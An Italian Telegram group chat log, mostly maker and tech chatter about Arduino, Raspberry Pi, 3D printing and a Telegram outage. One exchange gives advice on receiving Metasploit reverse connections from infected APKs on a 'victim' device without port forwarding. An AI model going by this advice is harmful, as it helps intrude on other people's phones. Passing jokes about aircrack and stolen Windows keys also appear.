io e mio padre eravamo indecisi se regalare quello della Xiaomi a mia madre
ahahahahah
ti ricordi le ciabatte radiocomandate della xiaomi? 
Uuh
No con mr pelo in giro durerebbe mezza giornata
ma lei non perde tanti peli
anche perché la spazzolo ogni settimana nelle stagioni in cui perde più peli
Eh quando perde peli lui bisogna spazzolarlo ogni giorno
E ciononostante lascia peli in giro
(comunque dicevo che non dura perché gli salta addosso per giocare)
Sto facendo una lista con tutti i prodotti Xiaomi ahahahahah
ah
Grandi vi seguo su instagram! I vostri post sulle notizie di informatica sono davvero utili
Ahahah
Grazie 
La serie su Python però dovreste farla a video, nei post non mi viene molta voglia di leggere. Secondo me se fate brevi video invece sarebbe più interessante (magari vi fa perdere più tempo però)
Xiaomi Fan #1
Stavano pensando di portare ied su YouTube in modo da rendere attivo il canale, ma momentaneamente stiamo cercando un doppiatore
ragazzi scusate conoscete un sito dove si possono fare prototipi di siti web graficamente senza codice free? tipo adobe xd
A chi interessa c'è questa video in offerta
Doppiatore?
Qualcuno che parla nel video
io e github
Ahahahahahahahahah 
toh, se volete crearvi un coso del genere vi risparmio pure di dovervi far scrivere il codice...


Raga... Convertitore digitale analogico duale con controllo pwm e duale tramite segnale booleano ne esistono? 
ma chi vi fa questi commit message

ma quell' "omg that's technology"
che cristoddio lo volevo tra due asterischi ma il mardown è down
peccato
Di questo cosa ne oensi? 
 
Keysight 
I5 8gb di ram
ho fatto il test del laser, è arrivato sull'albero più lontano che vedo dal quarto piano, e calcolando che sono in una zona alta del mio quartiere ci sta troppo.
orcoddiaz, ma metteteci Linux...
No vabbe
che tema è? 
Sta messo meglio del mio vecchio portatile quell oscilloscopio
no, è mark-down
*badum tss*
Oh, pian co' ea bocca
Non è mio, ma probabilmente non potevano sennò l'avrebbero fatto, comunque non è mio
30'000 euri
Paper
Stavo per mettere Flat Plat per GTK, ma ho visto il terminale e mi sono esplose le pupille


Se l'URL è un 
 viene automaticamente processato senza passare per il browser
thx
Se ti serve altro: 
È scritto tutto lá
io non l'avevo trovata
però l'avevo cercato sul sito di telegram
"Telepot reference" su google
È il primo risultato
Qualcuno ha mai sentito parlare di firejail?
Ma anche la botapi ufficiale, visto che gli elementi sono molto simili
Eh
Cosa?
Sarebbe? Mai sentito xD
.....
Anzi aspe, è tipo il firewall ma più forteh?
Ci sono un botto di librerie/wrapper/framework per i Bot Telegram
Telepot >>>>>>>>>>>>>>>
It depends
E' come chiedere il colore preferito
Verde
Ma non si era capito dalla propic
Il mio colore preferito è pyrogram allora
raga
noi ridiamo e scherziamo
Il mio è il Nero.
ma per Natale ho trasformato le propic di mezzo gruppo con dei cappellini
cosa facciamo per l'estate? 🧐
Se guardi nella history delle propic c'è ancora xD
Al posto dei cappellini metti gli ombrelloni


Delle tsar dietro a simulare il caldo 
Forse anche più che simulare...
Gli sticker di Catler
oplà
ovviamente se hai caldo ti vesti col piumone 
Isola
GG
in questa foto vedo 2 cose: un gran casino e un gran bell'oscilloscopio mamma mia io non riuscirei mai a lavorare in quel macello, ho tutto organizzato
io uso Rigol, ma i Keysight sono eccellenti
non è mio e non ci lavoro, foto che mi aveva mandato un mio amico
quelli ad occhio e croce sono almeno 20000€ di oscilloscopio
8 giga di ram !?
Un i5 ?!
Windows comprato!!?!?
Chiave rubata a 8€ comprata a una società fittizia di Cipro>>>
Nope
Mi potresti consigliare una sandbox su Linux allora?
Uh oddio
Sandbox?
Cosa?
Un videogame sandbox?
....
xD
Ho ritrovato questa perla
Parlare di performance con linguaggi interpretati è come parlare di leggerezza davanti ad un piatto di carbonara
Se è vegana è leggera
Test
FUNZIONA TELEGRAM 
Surriscaldamento ai server o blackout in Holland ?
Up
Entrambi probabilmente
Durov parla di "massive overheating"
Una sala server senza ventilazione o condizionamento diventa una bomba a orologeria...
Buongiorno
Salveeeee
Test for telegram dowb
Si lavora anche in vacanza
Ohh
Ma telegram è on???
Omfggg
.-.
Com'è che non è ancora esploso nulla?
ragazzi con arduino come faccio a ripetere una funzione dopo che sono passate delle ore?
c'è qualche libreria che tiene conto del tempo?
Telegram down?
Yessa
Yap
Dovresti usare un modulo clock
Invia un segnale digitale ogni tot secondi
Tu conti i secondi e deduci i minuti, le ore...
Sad story guyz 
Comunque a me va ancora male
sisi ho letto in giro questa soluzione ma volevo trovare una soluzione più veloce e senza moduli
a me crasha ancora telegram
Ragazzi ,provate a usare il cleverbot,e figo come assistant
è stato un power outage ad Amsterdam
ok, non va di nuovo
Attento all'orologio
Io e mi trovo benissimo.

Unico difetto è che x fargli controllare la Smart TV serve cmq il Chromecast

Con i Sonoff funziona benissimo, sebbene con la versione POW non è in grado di controllare i consumi

Adesso sto studiando come realizzare app per il Google Home, ieri sono finalmente riuscito a fargli fare un Hello World
Eh che cazzo mi rispondi adesso?!
Stavo ieri al negozio...
Io sono interessato al volume, voglio utilizzarlo come cassa
Sono stati i russi
Bastardi
Ahahah
ehi calmo  non é che possono rispondere tutti subito
Alleluja
YESS
Quando hostavo i server teamspeak ai miei amici dal mio portatile
E Telegram ha ripreso a funzionare dopo essere rimasto down tutta la notte e tutta la mattina per un surriscaldamento ai server europei
Bei tempi
Comvimxi tu mio padre a farsi 2h di macchina?
Perché mi hanno detto che come cassa non vale
Zona pippe
Mi invitate a nozze
UDDIO AHAHAHAH
Wep
Ah tutto si spiega


WEP key generator xd 100% true
HAHAHAAHAHH potevano mettere il tasto per avviare aircrack 
Ahahahaha
Connetti ed Aircrack
Connetti annulla ed aircrack
Non ci stavo più sperando
Da me é ancora mezzo down
Dopo la terza volta che fa finta di tornare up ci è tornato completamente da me
Razzisti
AHAHAHAH
Anche qua
Comunque "surriscaldamento dei server" mi è nuova
Dei locali server, non dei server in se
Manco il mio vecchio PC che arrivava a 200°C e 100° di GPU moriva di surriscaldamento...
(E arrivava veramente a quelle temperature mentre io me ne stavo tranquillo su csgo)
Ho preso 2 AtMega 32u4, quella del video delle Rubber ducky.
Una funziona correttamente, l'altra no.
Windows 10 non trova i driver per ATm32U4DFU.
Può darsi che non abbia caricato il bootloader?
Metti la teiera sul processore

Risparmio
Vorrei chiedere una cosa riguardo al video di hacking di metasploit per infettare gli apk. Se usiamo un ip remoto e la porta 4444 bisognerebbe fare un port forwarding sul router della "vittima". Esiste una soluzione senza port forwarding? (Ovviamente chiedo a scopo informativo)
non devi fare nessun port forwarding se non sul tuo di router
Ma con un cluster posso aumentare la ram del mio pc fancendo fare roba al cluster?
Cioè se lui ha la porta 4444 chiusa ma io l'ho aperta sul mio router (sia tcp che udp) funzions comunque? Mi sembra strano...
?
Empty Message?
Non per tutto, c'è da dire che le librerie per il Message Passing comunicano attraverso Ethernet
In realtà è una foto
E vengono largamente utilizzate lato server
Ah, Perfetto
perchè la mia foto profilo viene renderizzata male a te e da me si vede bene? 🤔🤔
A me sinceramente piacciono in orizzontale le foto
sì ma è brutto vedere nero sopra e sotto
Nah, per me è bello
ou
basta ascoltare shutup

E' l'unica raccolta che mi soddisfa ._. perchè ha abbastanza canzoni ed è come se l'avessi fatta io
Shuffle e via
HAHAHAHAHA io faccio la stessa cosa con la tua
Io non ci ho messo Wildcard nella mia .-.

Sbaglio o telegram è morto?
Uuu cooompletamente down in tutta italia e europa...gg
belli i messaggi che arrivano adesso e magari sono stati scritti alle 9 di mattina 
Dico per programmi di uso comune
Con MPI puoi solo eseguire del codice sorgente
Non puoi eseguire programmi compilati
E per minare bitcoin o altre criptovalute?
Ahh scusate cavolo
Me ne ero dimenticato
Puoi vedere su GitHub se esistono dei progetti Open Source per dei miner di Criptovalute in C
Ma é possibile in teoria?
Sì
Ciao a tutti, secondo voi è possibile inviare una stringa di caratteri ad arduino via Bluetooth?
Inviare da android*
 ❤️
Yes
ci sono tantissime app sul Play Store per controllare Arduino via bluetooth
Ti prego spiegami
io ti consiglio ArduController
Fino ad ora ne ho trovate tante che alla pressione di un tasto inviano un carattere
Quello che voglio fare io è differente
Una sorta di app, in cui io scrivo in una casella di testo e ció che scrivo viene inviato a arduino sotto forma di stringa
Non so se sono stato chiaro
Mi sto divertendo
In che modo sono collegati quei due pulsanti🤔
Uno collegato all'altro
🤔🤔
Yep
Fanno tipo da “deviatori”
In realtà arduino li vede come uno solo, giusto?
Qualcuno ha avuto il crash di fortnite all'avvio i tendo sul pc
Sto facendo il progetto di fine terza media per l’esame. Ora sto provando. Sabato/domenica prox metto Arduino e tutto nel plastico
Che progetto porti?
Una casa domotizzata
Modellino di casa ovviament
Un classico 
Portarla in scala 1:1 mi sembra difficoltoso
Posso mettere ad ogni rasp un blocco diverso
Beh, nella mia scuola sono l’unico che sa cosa è Arduino
Eh si
Allora che ti serve la computazione parallela? Puoi avviare su ogni raspi un miner diverso
Ma cambierebbe qualcosa?
Nella mia, abbiamo i kit, ma sappiamo usarlo solo io e un altro ragazzo...mi vedono come un alieno
Con una MPI puoi minare con più dispositivi sullo stesso blocco
Far fare a tutti un blocco o far fare a tutti blocchi diversi?
Ha differenza? Il guadagno é di più o di meno?
Là devi devi vedere tu con i test
E come faccio a dividere il blocco nel cluster?
Lo fa la MPI
E' come se lo stesso computer eseguisse i calcoli
Mpi é per?
Message Passing Interface, il software che ti permette di creare l'interfaccia per il passaggio di tutte le informazioni che servono
Per emulare una macchina unica con diversi dispositivi fisici
Una persona su un altro gruppo mi ha fatto venire un dubbio
É antiproduttiva sta cosa?
Infatti le MPI non vengono usate per questo
Quindi spendo più di quanto guadagno
Vengono usate nei Server Cluster di siti web e/o API per servire decine di milioni di client
Ma mpi mi fa un computer singolo da tanti computer?
Kinda
Crea un "Ambiente Virtuale" (il termine non è proprio esatto) per il linguaggio di programmazione che vuoi
Unendo tutte le risorse del Cluster
Quindi posso metterci qualsiasi tipo di server?
Un sorgente che sia scritto in un linguaggio che MPI supporti
Java?
Io so che supporta Python, C e Fortran
Lo supporta?
Dunno, cerca online
Ragazzi, domanda tecnica
Ho utilizzato la funzione system per creare una cartella in un programma in c++
Ma se ora per caso facessi eseguire questo .exe su Linux
La cartella verrebbe ugualmente creata?
Chi mi consiglia un buon sonoff touch? Che risponde subito al touch. Va bene anche se non si puó comandare da app
Quanto meno dovresti ricompilare
In che senso ricompilare?🤔
cambiare le istruzioni dentro system?
Se hai fatto un exe per Windows non verrà eseguito su Linux, ovviamente
Cosa devo fare per renderlo eseguibile lì
?
In linea di massima prendi il tuo sorgente c e lo importi nel tuo ambiente di sviluppo su Linux, quindi ricompili per avere l'eseguibile
Un ambiente di sviluppo leggero per Linux me lo sai suggerire?
Codeblocks
Multipiattaforma
Ehm a parte che appena l'ho letto ti ho risposto, ma hai magari sentito parlare del più grande down di telegram, che ancora adesso non è finito
ahahahahahah ma ero ironico ahahahahah
Ah ok 
Ho letto che vuoi usarlo come cassa ?

X quanto riguarda la qualità audio, il mini è più scarso rispetto al classico, ma a me non sembra affatto male.

Cosa intendi esattamente x usarlo come cassa ?

Lui si sincronizza con Spotify ecc.
Se riesce a suonare bene
Quindi volume alto da sentirlo in camera
Si il volume massimo è abbastanza alto e si sente x tutta la casa (100mq)

Cmq in un secondo momento si può sincronizzare con una cassa Bluetooth
ah
I sonoff si possono anche flashare con Arduino uno!!!!
Comunque io su Telegram da telefono ancora non riesco a scaricare i media. Da desktop invece vanno. É un problema solo mio o anche qualcun'altro lo ha?
Hai Telegram X?
Cosa ha in più?
Capito
Lavoro finito
Lo proveró, grazie
nascondi quel cavo e poi sarà perfetto
Fatto
allora è perfetto
Perfect
No
Strano.
Adesso vanno
Ok
Questo ce la fa ad alimentarmi un usb hub con attaccati dei raspberry?
Quale questo?

(Quando pensi: "metto il link dopo" ma ti scordi di metterlo)
potresti calcolare i secondi utilizzando il clock dell'arduino
incrementi una variabile nel loop ogni secondo
però il loop deve durare un secondo esatto
per questo si usano moduli a parte, che fanno la stessa cosa ma non intaccano il loop principale
ma programmer humor non era ammesso??
:(
?
Dipende che hub usi
E quanti rasp devi alimentare
Per minare bitcoin
Con i raspberry?
Hahahah
Megli gli asic?
È una presa per il culo?
Se proprio vuoi minare devi almeno metterli in un luogo con molte ventole e dissipatori
Gli asic?
Ovvio
Attacco DDOS
nop
hanno avuto un calo di corrente al raffreddamento
Raga sto creando un dual boot tra windows 7 e kali  linux quanti GB dovrei dedicare a kali?
Pochi
Tipo?
50?
20-25
Raga esiste una valida alternativa allo xiaomi air 13.3?
Dico allo stesso prezzo
xiaomi planks 4, uno smartphone di acacia

Ciao a tutti, scusate il disturbo. Ho un piccolo, ma fastidioso problema che non riesco a risolvere. So perfettamente che il gruppo non nasce per risolvere i problemi dei singoli, ma vi sarei grato se mi aiutaste a risolvere, premetto che non sono riuscito a trovare una soluzione su internet. In poche parole il mio smarphone non riesce ad ascoltare l' "Ok, Google" e anche cercando tra le impstazioni dell'app mi sono accorto che non è possibile attivare l'opzione "Rilevamento Ok Google". Sapete come risolvere? Il mo smartphone è uno xiaomi redmi 4 prime (markw) con rom lineage os 14.1 unofficial. Grazie mille a tutti
Intendi Google Assistant?
Si esatto 
L'assistente funziona normalmente per il resto, solo che ogni volta devo tenere il tasto home premuto per attivarlo
Lo attivi da questa schermata
È proprio questo il problema, non posso attivarlo
Sapete perché?
 che cassa useresti per "l'home made google assistant"?
Google Home mini = raspberry pi Zero Wireless + speaker
Google Home= raspberry pi 3 +speaker
^
Disattiva Voice Match
io userei uno speaker economico e un circuito amplificatore di quelli da pochi euro che si trovano su ebay
Su Banggood si trovano speaker e microfoni di ottima qualità con pochi soldi
È già disattivato
Ragazzi, host gratuito per bot python? Mi hanno bloccato l'account heroku 
Fanne un altro
Oppure usa un rpi
O un vps
Vps da 2,79€ al mese da Aruba
Se è un bot stupido buttalo su un pi zero
Ma secondo voi come mai Telegram sta avendo tutti sti problemi negli ultimi mesi?
Che violenza
Server
Quello di oggi era un problema di tutta Amsterdam
Da quello che ho capito
Ma magari i russi stanno cercando di sabotare i loro server
Caspita non si sono bene o male stati problemi, non é per il problema russo
oggi è stato un problema ai server ad Amsterdam, e non ha colpito solo Telegram
ha colpito anche l'aeroporto di Amsterdam, che non ha niente a che fare con telegram
Ah non lo sapevo
dovrebbe esserci stato un black out da quanto ho capito
hanno avuto un calo di corrente al sistema di raffreddamento
sarà scattato il thermal alert ed è morto tutto
LOL
AIUTO
E poi trovo un maker che programma e che segue overVolt... in un gruppo di producer 
eh?
Qualcuno qua è esperto di Assistant?
Perché ho la lampadina della sonoff, l'ho collegata a 2 Google Assistant, ma Uno dei 2 non funziona
Normale?
STO URLANDO CAZOZOZO
Foto da Sergio ❤️
Secondo voi cosa ha 
*
Ha stampato a una velocità estremamente lenta
a parte una stampante che stampa male?
25
Nel senso che devo migliorare
L'ultima stampa che ha fatto era buona e non ho toccato niente
Ufffffa
È una Prusa i3 clone
non è che hai le cinghie allentate?
Ora guardo
No sono buone :/
Qua ce n'è un altra
Cos'è quest'obrobrio malformato?
La dentiera di mio cugino invalido
allora non ho idea di cosa sia

Su 
 sono a 1€ + iva al mese. E si può comunque scegliere italia
Si
SkySilk
Eh?
why? 
Mi hanno bannato da heroku :(

cosa hai combinato? 
Boh
Forse perché avevo 6-7 bot 

Che software facile mi consigliate per fare i PCB?
Dovrei farci una shield per arduino
qualcuno ha mai comprato da 
 ?
Raga, è spam se chiedo:
Potreste darmi delle idee per software,bot Telegram che possono diventare famosi?

Ultimamente non sto programmando molto per mancanza di idee...
Mi sto solo impegnando un pò per una chat con html 5 ma niente di che,(cercherò di fare il possibile per evitare payload mandati su di essa)...
Se non posso chiederlo elimino subito, non voglio pubblicizzare nulla, e  non passerò nessun link.


 spammare.
non penso sia spam
Ho chiesto perché non so quali siano le vostre politiche in merito
Sorry
Ma no che non è spam
Solo che penso che se uno ha un'idea per qualcosa che possa diventare famoso... Lo farebbe lui, no? 

(disculpame 
 por mis conjuntivos locos, ho dormito 3 ore stanotte)
Ma spiegaci una cosa: ti sta arrivando una fotocamera nuova o vuoi distruggere la tua per autoconvincerti a prenderne un'altra?
Grazie che mi hai ricordato di togliere la sveglia per domani mattina
Che cazzo, ho fatto tutti i viaggi al nord dormendo anche di notte con la Canon in cappelliera...
Parto da Trento e dopo neanche due minuti si suicida peggio di un talebano
Comunque da questa storia ho perso 40€ ma ho ottenuto l'upgrade della vita: da Røde Pro a Røde Pro Plus 
Ahahahah
grande Lillo!!! Vero che sono eccezionali?????
Ubuntu
Raga 100 euro drone ?
Buono non c'è
Se lo vuoi buono buono
Sennò le robe cinesi ci stanno a 100 euro
Alla fine il trucco è sempre il solito, produci il tuo drone, lo butti sul mercato e con i soldi che guadagni te ne compri uno serio della concorrenza
The best way to use PHP books
Ma php é bello :c
Infatti quello è Go
Certo , dopo che li ho scoperti Internet può chiudere per me
Yup
Raga help: ho un amplificatore per chitarra, ieri ho provato ad attaccarci il cell con la musica, però la voce non si sente quasi per niente mentre la strumentale si sente benissimo... ho già provato con L’ equalizzatore, sia del cellulare che della cassa ma non ho ottenuto grandi miglioramenti.... che posso fare ?
Non credo sia per il vocalist
Che linguaggio sai?
Ehm....
PHP, java, c(molto brutto da Usare a lungo termine...) , c++, c#,python❤️, ruby❤️,VB(se lo si può definire linguaggio di programmazione), javascript, di markup conosco xml, css, html, e di scripting pochi, mi pare che lua era uno di quelli(?) Ma non ho avuto tempo di documentarmi
Quanti anni hai?
Tra poco potrò dire di conoscere anche asm
wow un botto
È solo un numero...
Comunque, pochi lo sanno
Cerco di rimanere più anonimo possibile
-.- e perché?
Pochi.
Se ti servo per un qualche lavoro e vuoi domandarmi della maggiore età, non posso.
Preferisco rimanere anonimo, al massimo ti posso passare un qualsiasi cosa ti serva da tg.
(Spero non sia spam, non so che politiche adottate, ma non sto pubblicizzando nulla...)
Ma per sapere tutti quei linguaggi una vita sociale c'è l'hai? (Non prenderla come offesa)
 ora sono curioso di vedere il resto della postazione

*disappointed*
COS PHP
ma ma ma, perchè il C non dovrebbe essere bello e il php invece si
è normale, il cellulare non riesce a spingere il diaframma di un altoparlante per chitarra..la parte strumentale ce la fa perchè ha frequenze diverse e riesce a farlo muovere, la voce no invece, perchè il diaframma non riesce a vibrare
non sono studiato sulle chitarre e su come sono, ma non è che il telefono tira fuori segnale a tensione troppo bassa? anche se poi passa per un amplificatore però...
Può essere anche colpa della voce che è in mono (?)
Mi pare che la voce è stereo
Altrimenti in auto suona solo da un lato
si infatti, è questione di tensione e di impedenza dell'altoparlante
non è che sia difficile, basta che per qualche ora ti metti a studiarti un linguaggio e poi lo usi un po', e lo sai...se vuoi approfondirlo poi puoi andare avanti con quello, ma per fare la maggiore delle cose già lo sai usare
Non intendo quel tipo di mono e stereo
vabbè, al di là della voce stereo o no, gli altoparlanti da auto sono diversi rispetto a quelli per gli strumenti, hanno impedenze differenti
Cos"è l'impendenza? L'ho letto anche sull'amplificatore a casa
Infatti nella produzione di musica, i bassi e le voci si mettono al centro del mix (in mono) e i vari strumenti a destra e sinistra (in stereo)
Penso sia la resistenza dello speaker
in un certo senso
ah che bello sentire qualche ragazzo che ne capisce..si è questione di impedenza dell'altoparlante
non è mia hahaahah, l'ho presa da programmerhumor
ù-ù
Ragaz ho un bel problema; su un pc dove c'è un bel po di lavoro sono stato infettato da un ransomware, che come sapete chiede il riscatto. Come potrei fare per decriptarli?
Quindi se attacco il pc c’è la fa ?
Hai spento il pc?
Non spegnerlo
Chiama la polizia postale o non saprei come aiutarti
Cosa potrebbe fare?
Se l'hai spento è un casino
Altrimenti online potrebbero esserci delle soluzioni
Ovviamente naviga con un altro computer
È ancora acceso
Tienilo acceso
Ho scollegato solo cavo di rete
Non so aiutarti, ma so che avevano trovato una soluzione
Dipende da quale ramsonware sei stato infettato
Se è uno vecchio e ben conosciuto potresti provare uno dei tanti software che rilasciano per decriptare i file... Potresti guardare sul sito di kaspersky dove c'erano piccoli tools per decriptare in caso la chiave fosse una di quelle conosciute. Anche altre case avevano tools del genere...
Attenzione che se avevi altri pc in rete potrebbero essere infettati anche quelli... Controllali...
Ragazzi Un info......... Con un Driver TMC2100 e uno stepper da 2,5A...... ho una Vref al 70% pari a 2,47A....... si bruceranno i driver?
🤣🤣🤣
devo cambiare motori?
prova ma non credo..di solito i segnali provenienti da pc vengono amplificati e mixati prima di essere trasmessi dall'altoparlante..non ho mai provato direttamente su un amplificatore
Realizzare un programma che, dopo aver caricato un array di 100 elementi con numeri casuali (da 0  1000) stampi la somma dei  primi 20 elementi dell'array (significa che dovete sommare SOLO i primi 20 elementi dell'array, non i restanti 80).
Rifare il programma usando le funzioni. Bisogna realizzare 3 funzioni, nella prima, chiamata CaricaArray bisogna passare 2 parametri, il 1° è l'array e il 2° è il numero degli elementi degli array (100 in questo caso); nella seconda, chiamata SommaArray bisogna passare 2 parametri, il 1° è l'array e il 2° è il numero degli elementi degli array (100); nella terza bisogna stampare il risultato finale (decidete voi i parametri).il mio prof mi hodia
i tmc2100 hanno 1.2A di RMS, con picco a 2.5A
Manuel cosa
ok, mi consigli un driver per motori da 2,5 A ?
praticamente li brucio
la domanda è: ma hai proprio la necessità di farli lavorare a 2.5A in continuazione?
(non so cosa devi farci)
ciao, ma con il raspberry connesso tramite ssh? posso far partire gui?
ho questi motori
se poi possono lavorare a 1,2A vabene,
dipende cosa devi farci :P
stampa 3d
eh, allora basta ed avanza anche 600/800 mhA
metto 0,8
e via
fai così
ok
siccome i tmc2100 non sono tra i migliori
metti 1V per iniziare
ok
più che altro soffrono di perdita di passi
quindi dovrai scendere di accelerazioni (in special modo in stealthchop)
quindi, o passi a spreadcycle e rinunci al silenzio assoluto ma non hai perdita di passi
il silenzio me lo scordo
o tieni stealthchop, sali un pochino di Vref, abbassi di accelerazioni ed incroci le dita 
non rischio
3.
Grazie mille, GENTILISSIMO
cmq se in futuro volessi cambiarli punta ai 2208
Qualcuno sa se c'è un canale italiano per la stampa 3d, magari per la anycubic i3 mega?
cosa hanno di buono ripestto ai 2100 e 2130
i 2130 sono sempre i soliti 2100 con SPI ed alcune feature carine (tipo stallguard)
i 2208 sono proprio una nuova generazione che ha lo stealthchop2, che permette alte accelerazioni e non soffre di perdite di passi
In pratica ti ha detto come fare
inoltre i 2208 supportano la UART
devo vedere il datasheet per vedere cosa montare come motore
appunto 🤷‍♂️
devi usare VNC, l'ssh è una cosa completamente diversa
Anche se io i nomi di variabili, funzioni e classi li metterei tutti in inglese
io sono un passo avanti: metà in inglese e metà in italiano
u.u
Si infatti lo fatto in cinque secondi
Questo è il primo
Ora faccio il secondo
Ricordati le funzioni, l'indentazione e i return
Ok ma perché io sono abituato con visual
E lo devo ancora reinstallare
Perché lo formattato stamattina che c'era troppa roba
Inutile
cerca di scrivere più parole per messaggio, che sennò arrivano 560 notifiche
Ok
OK graze
Matteo formata il PC l'unica cosa che puoi fare
Se lo vuoi ancosmra riutilizzare
alt f4 non va?

ahah
Sono dati importanti se era un pc da smanettare già l’avrei fatto
Ho trovato il tool di Kaspersky
combofix non fa nulla?
naah, di solito sia pc che telefono tengono tensioni simili in uscita, forse il pc un pelo di più ma sempre li siamo, non credo migliori di molto, anzi, certi telefoni tirano fuori più di quanto non facciano molti portatili
io mi ricordo che nell'azienda di mio babbo successe, alla fine trovarono un altra azienda che li ha decrittati e hanmo speso sui 120/130
Non hai un punto di ripristino
ecco, prova con quello, se manco lui ce la fa allora perdi pure le speranze
e far partire una live di linux per vedere se ha effettivamente criptato tutti i file?
poco buggato mi dicono
??
AHAH
che cosa brutta
diciamo che dovrebbe essere un pelino più centrato 
Io mi chiedo cosa stia facendo dellla mia vita in questo momento
Potremmo fare un microonde con dei cellulari🤔
Come risparmiare!
oppure prendi 3 microonde, li distruggi e ci fai una pistola spara elettroni che accende lucette vicino a te con un'efficienza del 0.08%
ma che minchiata...
concordo
non spara elettroni, ma campi elettromagnetici
che poi, chissà che studio approfondito, sulla scatola del modem c'è scritto "2.4GHz"
ecco
quell cos li nzomme, io non sono studiato a riguardo
Studio? Ahhahaha anche nel 1990 le scimmie capivano che i 2,4GHz sono onde elettromagnetiche
e senza una guida d'onda il magnetron dei forni a microonde non riscalda nulla (diciamo che nel migliore dei casi alza la temperatura di mezzo grado con un esposizione di qualche minuto)
no maa, c'è, si sono studiati la conversione, 2.4GHz = 2400MHz
Ah, giusto 
Ahahaha
si..beh... io ho visto tipo qualche video in cui prendono 3 microonde e si fanno tipo una pistola con una parabola davanti, in realtà non fa quasi nulla, a malapena accende una luce se la metti dentro, quindi...piuttosto una tesla, quella semmai qualcosa fa
Però non hanno aggiunto che esiste anche il wifi a 5GHz
quello stermina direttamente la vita avendo frequenza maggiore e portando più energia secondo il loro ragionamento
nota: le pareti interne del forno a microonde hanno una forma e una dimensione particolare proprio per il fatto che lavorano come una guida d'onda concentrando al centro del forno tutte le onde elettromagnetiche prodotte dal magnetron, e questo è il perché non bisognerebbe mai deformare le pareti interne o spostare il magnetron
Appunto
giàà, tra l'altro, a che frequenza lavora il microonde?
2400MHz is the new 2.4GHz
giusto per 1) rimanere vintage e 2)non far fare 2+2 alla gente a casa che ha un modem con scritto sopra "2.4GHz" in grande
Fonte wikipedia: microonde lavora ad una frequenza di 2.45GHz
WOW si sono laureati per scoprirlo eh
fiero, ecco perchè il modem si riscalda così tanto
hanno proprio condotto uno studio eh

Ma quelle del microonde sono ionizzanti
beh si, c'è anche da dire che il modem non credo ti spari in faccia 800W...
: 
quando ha smontato il microonde rotto?
vistoo
Anche voi cercate di vincere i suoi giveaway?
da vedere con la termocamera come si nota il segno di calore proprio dove passano le onde, è una figata
naah, sai quanta gente c'è che ci prova? è un po' come la lotteria, anche se è robba da 2000 euro l'una...

Io ci provo tanto ci si mette poco a inserire la propria mail
30 mila
Io non ci ho mai provato
si beh, devi essere suo patreon però
No vale anche per gli iscritti, tipo 2 prodotti ai patreon e 1 agli iscritti
mmhh... dimmi dove inserire la mail
In quasi tutti i video fa i giveaway e in descrizione mette il link di un google form
mmhh..ok
oppure usare i microonde com router wifi
quotone
Lavaggio annuale della tastiera ✅
ora vi sto scrivendo con la tastiera bagnata e senza keycap
a qualcuno è arrivato oreo 8.1?
still 7.0
hanno aggiunto le gesture e devo dire che alla fine sono fighe
io per avere l'8.1 devo cambiare telefono
anzi, secondo me l'S3 mini lo avrà
Io devo ancora capire se arriverà sul mio Xperia x.
Intanto 8.0 è arrivato da mesi e le patch di sicurezza continuano ad aggiornarle mensilmente
Qualcuno sa come bypassare/disattivare i fitri p2p che mettono i provider
prova ad aprire le porte sul modem
python dovrebbe essere anche di scripting
È tutto così comunista
e comunque leggendo quello che scrivi mi ritrovo davvero molto 
Nessuno ha mai provato a installare Parrot? 🤔
Io ho un parrot sul balcone, dici che l'ho installato?
Dici lanciare un pappagallo IN STALLO
*batum tss*
Esci la foto
*esce dal gruppo*
Io invece ho 3 doggos
se sono dogee va bene
 ➡️
è uscita
Ecco....dopo questa puoi uscire pure tu

fatto
 plz dimmi se è  un bug di mano o di telegram sta cosa
cosa c'entra la mano? non può buggarsi e farti restare il tag
non sono i bot che ti taggano
Be allora perche fa così ? Anche nel pc si è  buggato
eh è di Telegram
toh, eliminato il messaggio
Ma solo a me l'app di YouTube mi fa navigare fra i video ma quando li apro non si caricano?
Bug di telegram
E dopo un po' si blocca e necessita riavvio
Lol
PROPRIO LUI
 ma per la todolist usare un file ms project?
NN E VRO TLGRAM NN A BAG E CLPA DLL SUO CLLULLAR
Secondo voi con due batterie agli ioni di litio posso alimentare un raspberry?
Ragazzi per sbaio ho fatto un cortocircuito sul bcm17 del mio Raspberry pi 3 b+ è possibile risolvere??? Per favore aiutatemi
eh lo so, li parliamo di oscilloscopi per laboratori universitari e ad alta fedeltà di misura
Lillo non mi fare vedere queste cose che sono debole di cuore 
Grazie dell'aiuto...
Ha sfiammato?
No..
Si è spento senza un apparente motivo
E non parte piu
Si accende solo il led rosos
Rosso*
Che bello telegram 

Ripperoni
Già
C'è dentro una scheda SD?
Cercate di mandare piú parole per messaggio plis
Si
Guarda se funziona ancora
Ne ho provata un'altra funzionante ma niente
Il led verde non ne vuole sapere
È verde o rosso il led fisso che ti appare?
Quello rosso rimane acceso
E quello verde non si accende piu
Ah ok
Questo è un problema
Secondo te posso fargli qualcosa??
Puzza di bruciato?
No...
A me quando è successo con l'Orange pi non c'è stato nulla da fare, morto
Hai un tester sotto mano?
Idem
Come sei rassicurante
Si
Pardòn
Alimentalo e guarda se c'è tensione sui 3.3v
L'ho già fatto
0volt
....e?
Frittura mista

Di raspberry...
Sai saldare SMD?
Più Meno
Potresti rischiare e provare a cambiare il regolatore di tensione
"rischiare" ormai è fottuto...
Ci proverò
Ma sinceramente dubio fortemente serva a molto, c'è tanta roba più sensibile a monte di qel componente
Tipo?
Rischiare di buttare altri soldi intendo
Quanto costa il regolatore...?
Buona parte della logica lavora a 3.3 se non erro, e quella è MOLTO più sensibile del regolatore di tensione
Lo so... L'intero Raspberry va a 3.3
Grazie dell'aiuto e supporto...
Lo apprezzo
Ma figurati per così poco, invece... Auguri...
Grazie
🤔regolatore di tensione oppure diodo di protezione bruciati
* overVolt
❤️
Ho trovato il "cosetto nero" vicino a J8 che è esploso
Credo sia quello
E credo che sia un diodo
Secondo voi??
esci la foto
dovrebbe essere il diodo di protezione
sapete se si potrebbe controllare con arduino un quadro strumenti di una ford focus 1 serie?
se serve il protollo obd2 è PWM J1850
probabile
l'ho visto fare con il quadro di una polo
Mi consigliate le zolo liberty?
si assolutamente, sono migliori rispetto alle Zolo+..più comode ed ergonomiche e suonano meglio, le Zolo+ sono piatte e senza bassi, e scivolano dall'orecchio
Ad esempio per correre non mi scivoleranno dalle orecchie ogni 3 secondi?
no, hanno l'archetto che si blocca dentro il padiglione, e varie misure di gommini..le Zolo+ invece si che scivolano, perchè sono più grosse
Ok grazie mille
figurati
Ecco la foto
